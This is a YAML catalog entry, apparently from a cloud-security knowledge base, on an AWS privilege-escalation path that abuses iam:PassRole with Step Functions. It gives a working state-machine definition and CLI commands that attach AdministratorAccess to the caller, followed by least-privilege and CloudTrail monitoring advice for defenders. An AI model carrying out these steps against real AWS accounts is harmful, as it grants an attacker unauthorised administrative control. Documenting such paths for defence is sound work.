id: stepfunctions-001
name: iam:PassRole + states:CreateStateMachine + states:StartExecution
category: new-passrole
services:
  - iam
  - stepfunctions

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role to the Step Functions service
    - permission: states:CreateStateMachine
      resourceConstraints: No resource constraints required
    - permission: states:StartExecution
      resourceConstraints: No resource constraints required
  additional:
    - permission: states:DescribeExecution
      resourceConstraints: Useful for polling execution status to confirm the attack succeeded
    - permission: states:DescribeStateMachine
      resourceConstraints: Useful for verifying the state machine was created with the correct definition
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `states:CreateStateMachine`, and `states:StartExecution` can escalate privileges by creating a Step Functions state machine that uses an admin IAM role and contains an ASL (Amazon States Language) definition with an SDK integration step that calls `iam:AttachUserPolicy`. Starting an execution causes Step Functions to run the definition as the passed admin role, attaching AdministratorAccess to the starting user.

prerequisites:
  admin:
    - A role must exist that trusts states.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - A role must exist that trusts states.amazonaws.com and has elevated permissions

exploitationSteps:
  awscli:
    - step: 1
      command: |
        cat > /tmp/sfn-privesc-def.json << 'EOF'
        {
          "Comment": "Privilege escalation via Step Functions SDK integration",
          "StartAt": "AttachAdminPolicy",
          "States": {
            "AttachAdminPolicy": {
              "Type": "Task",
              "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
              "Parameters": {
                "UserName": "STARTING_USER",
                "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
              },
              "End": true
            }
          }
        }
        EOF
      description: Create the malicious ASL definition. The state machine uses the Step Functions SDK integration to call iam:AttachUserPolicy directly — no Lambda function required.
    - step: 2
      command: |
        aws stepfunctions create-state-machine \
          --name privesc-sfn \
          --definition file:///tmp/sfn-privesc-def.json \
          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --type STANDARD
      description: Create the state machine, passing the admin role via iam:PassRole. Step Functions will use this role when executing the state machine definition.
    - step: 3
      command: |
        aws stepfunctions start-execution \
          --state-machine-arn STATE_MACHINE_ARN
      description: Start an execution of the state machine. Step Functions runs as the admin role and calls iam:AttachUserPolicy, granting AdministratorAccess to the starting user.
    - step: 4
      command: |
        aws stepfunctions describe-execution \
          --execution-arn EXECUTION_ARN \
          --query 'status' \
          --output text
      description: Poll execution status until it reaches SUCCEEDED, confirming the privilege escalation has completed.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative Step Functions roles** - Very rarely does a state machine need administrative access. Use the principle of least privilege and scope state machine roles to only the specific AWS APIs the state machine legitimately calls.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificStepFunctionsRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "states.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict `states:CreateStateMachine`** - This permission lets any holder define arbitrary state machine workflows with any role. Restrict it to trusted CI/CD principals only.
  - Monitor CloudTrail for unusual state machine creation followed by immediate execution
  - Monitor CloudTrail for state machine creation by principals who do not usually create state machines
  - Monitor CloudTrail for roles being passed to Step Functions that haven't been used before
  - Monitor and alert on state machine creation with privileged roles
  - Regularly audit state machines for excessive IAM permissions on their execution roles
  - Regularly audit all IAM roles that trust states.amazonaws.com and down-scope any with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.

